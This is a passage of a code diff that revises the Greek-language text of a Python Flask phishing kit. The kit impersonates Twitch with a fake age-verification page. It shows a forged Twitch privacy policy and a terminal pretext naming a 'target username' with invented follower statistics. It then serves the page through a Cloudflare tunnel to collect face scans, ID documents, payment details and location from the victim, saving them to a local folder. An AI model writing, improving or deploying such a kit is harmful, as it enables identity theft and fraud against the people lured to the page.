-                <li>Τακτικοί έλεγχοι ασφάλειας και δοκιμές διείσδυσης</li>
-                <li>Έλεγχοι πρόσβασης και πρωτόκολλα πιστοποίησης</li>
+                <li>Τακτικοί έλεγχοι ασφαλείας και δοκιμές διείσδυσης</li>
+                <li>Πρωτόκολλα ελέγχου πρόσβασης και ταυτοποίησης</li>
                 <li>Συμμόρφωση με PCI DSS για δεδομένα πληρωμών</li>
             </ul>
             
-            <h2>Διάρκεια Διατήρησης Δεδομένων</h2>
+            <h2>Διατήρηση Δεδομένων</h2>
             <p>Όλα τα δεδομένα επαλήθευσης διαχειρίζονται σύμφωνα με την πολιτική διατήρησής μας:</p>
             <ul>
                 <li>Δεδομένα αναγνώρισης προσώπου: Διαγράφονται αυτόματα εντός 7 ημερών</li>
                 <li>Έγγραφα ταυτότητας: Κρυπτογραφούνται και διαγράφονται εντός 30 ημερών από επιτυχή επαλήθευση</li>
-                <li>Δεδομένα πληρωμών: Επεξεργάζονται με ασφάλεια και διατηρούνται μόνο όπως απαιτείται από το νόμο</li>
+                <li>Δεδομένα πληρωμής: Επεξεργάζονται με ασφάλεια και διατηρούνται μόνο όσο απαιτείται από το νόμο</li>
                 <li>Δεδομένα τοποθεσίας: Ανωνυμοποιούνται εντός 24 ωρών, διαγράφονται εντός 7 ημερών</li>
-                <li>Μεταδεδομένα: Διατηρούνται για λόγους ασφάλειας έως και 90 ημέρες</li>
+                <li>Μεταδεδομένα: Διατηρούνται για λόγους ασφαλείας έως και 90 ημέρες</li>
             </ul>
             
-            <h2>Δικαιώματα Σας</h2>
-            <p>Έχετε το δικαίωμα να:</p>
+            <h2>Δικαιώματά σας</h2>
+            <p>Έχετε το δικαίωμα:</p>
             <ul>
-                <li>Έχετε πρόσβαση στα δεδομένα επαλήθευσής σας κατόπιν αιτήματος</li>
-                <li>Ζητήσετε τη διαγραφή των δεδομένων σας πριν από τις τυπικές περιόδους διατήρησης</li>
-                <li>Εξαιρεθείτε από συγκεκριμένη συλλογή δεδομένων (μπορεί να περιορίσει τη λειτουργικότητα του λογαριασμού)</li>
-                <li>Υποβάλετε καταγγελία σχετικά με τις πρακτικές διαχείρισης δεδομένων</li>
-                <li>Ανακαλέσετε τη συγκατάθεσή σας για επεξεργασία δεδομένων</li>
+                <li>Πρόσβασης στα δεδομένα επαλήθευσής σας κατόπιν αιτήματος</li>
+                <li>Αίτησης διαγραφής των δεδομένων σας πριν από τις τυπικές περιόδους διατήρησης</li>
+                <li>Εξαίρεσης από συγκεκριμένες συλλογές δεδομένων (μπορεί να περιορίσει τη λειτουργικότητα του λογαριασμού)</li>
+                <li>Υποβολής καταγγελίας σχετικά με πρακτικές διαχείρισης δεδομένων</li>
+                <li>Ανάκλησης συγκατάθεσης για επεξεργασία δεδομένων</li>
             </ul>
             
-            <h2>Κοινή Χρήση με Τρίτους</h2>
-            <p>Δεν πουλάμε ή μοιραζόμαστε τα δεδομένα επαλήθευσής σας με τρίτους για σκοπούς μάρκετινγκ. Τα δεδομένα μπορεί να κοινοποιούνται με:</p>
+            <h2>Κοινοποίηση σε Τρίτους</h2>
+            <p>Δεν πουλάμε ή μοιραζόμαστε τα δεδομένα επαλήθευσής σας με τρίτους για σκοπούς μάρκετινγκ. Τα δεδομένα ενδέχεται να κοινοποιηθούν σε:</p>
             <ul>
-                <li>Ομάδες Εμπιστοσύνης & Ασφάλειας για εξέταση επαλήθευσης</li>
+                <li>Ομάδες Εμπιστοσύνης & Ασφάλειας για έλεγχο επαλήθευσης</li>
                 <li>Νομικές αρχές όταν απαιτείται από το νόμο</li>
-                <li>Επεξεργαστές πληρωμών (μόνο για επαλήθευση πληρωμών)</li>
+                <li>Παρόχους πληρωμών (μόνο για επαλήθευση πληρωμής)</li>
                 <li>Παρόχους υπηρεσιών υπό αυστηρές συμφωνίες εμπιστευτικότητας</li>
             </ul>
             
             <div class="highlight">
-                Για ερωτήσεις σχετικά με τις πρακτικές απορρήτου μας ή για να ασκήσετε τα δικαιώματά σας, επικοινωνήστε με την Ομάδα Απορρήτου μας στο privacy@twitch.tv
+                Για ερωτήσεις σχετικά με τις πρακτικές απορρήτου μας ή για την άσκηση των δικαιωμάτων σας, επικοινωνήστε με την ομάδα απορρήτου στο privacy@twitch.tv
             </div>
         </div>
     </body>
     </html>'''
 
 if __name__ == '__main__':
-    # Έλεγχος εξαρτήσεων και cloudflared
+    # Εγκατάσταση εξαρτήσεων και έλεγχος cloudflared
     cloudflared_ok = check_dependencies()
     
-    # Παράμετροι γραμμής εντολών
-    interactive = '--interactive' in sys.argv
+    # Λήψη ρυθμίσεων διαδραστικά (πάντα προτρέπει)
+    VERIFICATION_SETTINGS = get_verification_settings()
     
-    # Λήψη ρυθμίσεων (μη διαδραστικά αν δεν δοθεί --interactive)
-    VERIFICATION_SETTINGS = get_verification_settings(interactive=interactive)
-    
-    # Καταστολή banner Flask
+    # Απενεργοποίηση του προεπιλεγμένου banner και των καταγραφών του Flask
     log = logging.getLogger('werkzeug')
     log.setLevel(logging.ERROR)
     
-    # Αποτροπή σφάλματος WERKZEUG_SERVER_FD
+    # Αφαίρεση τυχόν μεταβλητών περιβάλλοντος του Werkzeug reloader
     os.environ.pop('WERKZEUG_SERVER_FD', None)
     os.environ['WERKZEUG_RUN_MAIN'] = 'false'
     
-    # Εύρεση διαθέσιμης θύρας
+    # Εύρεση διαθέσιμης θύρας (ξεκινάμε από 4046, δοκιμάζουμε τις επόμενες αν είναι κατειλημμένη)
     port = 4046
     max_port = 4050
     while port <= max_port:
@@ -2585,29 +2667,36 @@ if __name__ == '__main__':
             break
         port += 1
     if port > max_port:
-        print("[ΣΦΑΛΜΑ] Δεν βρέθηκε διαθέσιμη θύρα στην περιοχή 4046-4050.")
+        print("[ΣΦΑΛΜΑ] Δεν βρέθηκε διαθέσιμη θύρα στο εύρος 4046-4050.")
         sys.exit(1)
     
-    script_name = "Twitch Επαλήθευση Ηλικίας"
+    script_name = "Επαλήθευση Ηλικίας Twitch"
     
     print("\n" + "="*60)
     print("ΣΕΛΙΔΑ ΕΠΑΛΗΘΕΥΣΗΣ ΗΛΙΚΙΑΣ TWITCH")
     print("="*60)
-    print(f"[+] Όνομα Χρήστη Στόχου: @{VERIFICATION_SETTINGS['target_username']}")
-    print(f"[+] Τύπος Λογαριασμού: {VERIFICATION_SETTINGS['account_type'].upper()} ΛΟΓΑΡΙΑΣΜΟΣ")
+    print(f"[+] Όνομα στόχου: @{VERIFICATION_SETTINGS['target_username']}")
+    print(f"[+] Τύπος λογαριασμού: {VERIFICATION_SETTINGS['account_type'].upper()} ΛΟΓΑΡΙΑΣΜΟΣ")
     
     if VERIFICATION_SETTINGS.get('profile_picture'):
-        print(f"[+] Εικόνα Προφίλ: {VERIFICATION_SETTINGS['profile_picture_filename']}")
+        print(f"[+] Εικόνα προφίλ: {VERIFICATION_SETTINGS['profile_picture_filename']}")
     else:
-        print(f"[!] Δεν βρέθηκε εικόνα προφίλ")
-        print(f"[!] Τοποθετήστε οποιαδήποτε εικόνα (jpg/png) στον φάκελο {DOWNLOAD_FOLDER} για χρήση ως προφίλ")
+        print(f"[!] Δεν βρέθηκε εικόνα προφίλ· χρήση προεπιλεγμένου avatar.")
+        print(f"[!] Τοποθετήστε μια εικόνα στο {DOWNLOAD_FOLDER} ή καθορίστε διαδρομή κατά τη ρύθμιση.")
+    
+    print(f"[+] Ακόλουθοι: {VERIFICATION_SETTINGS.get('followers', 'τυχαίο')}")
+    print(f"[+] Ακολουθεί: {VERIFICATION_SETTINGS.get('following', 'τυχαίο')}")
+    if VERIFICATION_SETTINGS['account_type'] == 'streamer':
+        print(f"[+] Συνολικές προβολές: {VERIFICATION_SETTINGS.get('total_views', 'τυχαίο')}")
+    else:
+        print(f"[+] Ηλικία λογαριασμού: {VERIFICATION_SETTINGS.get('account_age', 'τυχαίο')} ημέρες")
     
     print(f"[+] Τα δεδομένα θα αποθηκευτούν στο: {DOWNLOAD_FOLDER}")
     print(f"[+] Διάρκεια σάρωσης προσώπου: {VERIFICATION_SETTINGS['face_duration']} δευτερόλεπτα")
     if VERIFICATION_SETTINGS['id_enabled']:
-        print(f"[+] Επαλήθευση ταυτότητας: Ενεργοποιημένη ({VERIFICATION_SETTINGS.get('id_type', 'government')} ταυτότητα)")
+        print(f"[+] Επαλήθευση ταυτότητας: Ενεργοποιημένη ({VERIFICATION_SETTINGS.get('id_type', 'government')} ID)")
     if VERIFICATION_SETTINGS['payment_enabled']:
-        print(f"[+] Επαλήθευση πληρωμών: Ενεργοποιημένη")
+        print(f"[+] Επαλήθευση πληρωμής: Ενεργοποιημένη")
     if VERIFICATION_SETTINGS['location_enabled']:
         print(f"[+] Επαλήθευση τοποθεσίας: Ενεργοποιημένη")
     print("\n[+] Δημιουργήθηκαν φάκελοι:")
@@ -2622,47 +2711,54 @@ if __name__ == '__main__':
     print("\n[+] Εκκίνηση διακομιστή στη θύρα", port)
     print("[+] Πατήστε Ctrl+C για διακοπή.\n")
     
-    # Τερματική προτροπή
+    # Ενημερωτική προτροπή τερματικού
     print("="*60)
-    print("ΤΕΡΜΑΤΙΚΗ ΠΡΟΤΡΟΠΗ ΓΙΑ ΧΡΗΣΤΗ")
+    print("ΠΡΟΤΡΟΠΗ ΤΕΡΜΑΤΙΚΟΥ ΓΙΑ ΤΟ ΧΡΗΣΤΗ")
     print("="*60)
     print(f"Το Twitch ζητά επαλήθευση ηλικίας για τον λογαριασμό:")
-    print(f"👤 Όνομα Χρήστη: @{VERIFICATION_SETTINGS['target_username']}")
+    print(f"👤 Όνομα: @{VERIFICATION_SETTINGS['target_username']}")
     print(f"🎮 Τύπος: {VERIFICATION_SETTINGS['account_type'].upper()} ΛΟΓΑΡΙΑΣΜΟΣ")
     if VERIFICATION_SETTINGS.get('profile_picture'):
-        print(f"🖼️  Προφίλ: Χρήση εικόνας προφίλ από λογαριασμό")
+        print(f"🖼️  Προφίλ: Χρήση εικόνας προφίλ από τον λογαριασμό")
     else:
         print(f"👤 Προφίλ: Προεπιλεγμένο avatar Twitch")
     
-    followers = random.randint(500, 10000) if VERIFICATION_SETTINGS['account_type'] == 'streamer' else random.randint(10, 1000)
-    print(f"📊 Στατιστικά: {followers} ακόλουθοι • {random.randint(30, 365*3)} ημέρες παλιός")
+    followers = VERIFICATION_SETTINGS.get('followers', 'τυχαίο')
+    following = VERIFICATION_SETTINGS.get('following', 'τυχαίο')
+    print(f"📊 Στατιστικά: {followers} ακόλουθοι • {following} ακολουθεί")
+    if VERIFICATION_SETTINGS['account_type'] == 'streamer':
+        views = VERIFICATION_SETTINGS.get('total_views', 'τυχαίο')
+        print(f"👀 Προβολές: {views}")
+    else:
+        age = VERIFICATION_SETTINGS.get('account_age', 'τυχαίο')
+        print(f"📅 Ηλικία λογαριασμού: {age} ημέρες")
     
-    print(f"🔒 Αιτία: Απαιτείται επαλήθευση ηλικίας για {'streaming' if VERIFICATION_SETTINGS['account_type'] == 'streamer' else 'προβολή περιεχομένου με περιορισμό ηλικίας'}")
-    print(f"⏰ Χρονικό όριο: Ολοκληρώστε εντός 24 ωρών")
-    print("📍 Απαιτούμενα: Σάρωση προσώπου, επαλήθευση ταυτότητας και έλεγχος τοποθεσίας")
+    print(f"🔒 Λόγος: Απαιτείται επαλήθευση ηλικίας για {'μετάδοση' if VERIFICATION_SETTINGS['account_type'] == 'streamer' else 'προβολή περιεχομένου περιορισμένης ηλικίας'}")
+    print(f"⏰ Χρονικό όριο: Ολοκλήρωση εντός 24 ωρών")
+    print("📍 Απαιτούνται: Σάρωση προσώπου, έγγραφα ταυτότητας και έλεγχος τοποθεσίας")
     print("="*60)
-    print("Ανοίξτε τον παρακάτω σύνδεσμο σε πρόγραμμα περιήγησης για να ξεκινήσετε την επαλήθευση...\n")
+    print("Ανοίξτε τον παρακάτω σύνδεσμο στον περιηγητή για να ξεκινήσετε την επαλήθευση...\n")
     
-    # Εκκίνηση Flask σε ξεχωριστό νήμα
+    # Εκκίνηση Flask σε ξεχωριστό νήμα με απενεργοποιημένο το reloader
     flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port, debug=False, use_reloader=False, threaded=True))
     flask_thread.daemon = True
     flask_thread.start()
-    time.sleep(2)  # Χρόνος για εκκίνηση του Flask
+    time.sleep(2)  # Δίνουμε χρόνο στο Flask να ξεκινήσει
     
     local_url = f"http://127.0.0.1:{port}"
-    print(f"Τοπικός Σύνδεσμος: {local_url}")
+    print(f"Τοπική διεύθυνση URL: {local_url}")
     
-    # Εκκίνηση cloudflared αν υπάρχει
+    # Προσπάθεια εκκίνησης cloudflared αν είναι διαθέσιμο
     if cloudflared_ok:
-        print("Εκκίνηση Cloudflare tunnel... (μπορεί να διαρκέσει λίγο)")
+        print("Εκκίνηση σήραγγας Cloudflare... (αυτό μπορεί να πάρει λίγο χρόνο)")
         try:
             run_cloudflared_and_print_link(port, script_name)
         except KeyboardInterrupt:
             print("\n[+] Τερματισμός διακομιστή επαλήθευσης Twitch...")
             sys.exit(0)
     else:
-        print("Το Cloudflare tunnel δεν είναι διαθέσιμο. Χρησιμοποιήστε τον τοπικό σύνδεσμο παραπάνω.")
-        # Διατήρηση του κύριου νήματος
+        print("Η σήραγγα Cloudflare δεν είναι διαθέσιμη. Χρησιμοποιήστε την τοπική διεύθυνση URL παραπάνω.")
+        # Διατήρηση του κύριου νήματος ενεργού
         try:
             while True:
                 time.sleep(1)
